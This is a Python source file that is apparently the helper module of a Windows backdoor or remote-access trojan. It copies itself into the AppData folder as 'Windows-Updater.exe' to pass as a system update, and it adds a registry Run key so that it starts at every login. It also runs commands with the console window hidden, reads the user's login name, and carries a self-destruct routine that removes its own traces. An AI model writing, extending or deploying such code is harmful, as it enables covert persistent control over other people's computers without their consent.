import os
import subprocess as sp
import shutil
import sys

def addPersistence():
    backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
    if os.path.exists(backdoor_location):
        return "already-enabled"
    try:
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)
        return "enabled"
    except Exception as e:
        return f"error: {e}"

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME

def cmd(command):
    result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,
                        text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    if not err:
        return out
    else:
        return err

def selfdestruct():
    try:
        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        if os.path.exists(update_location):
            os.remove(update_location)
        sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
        return True

    except Exception as e:
        return e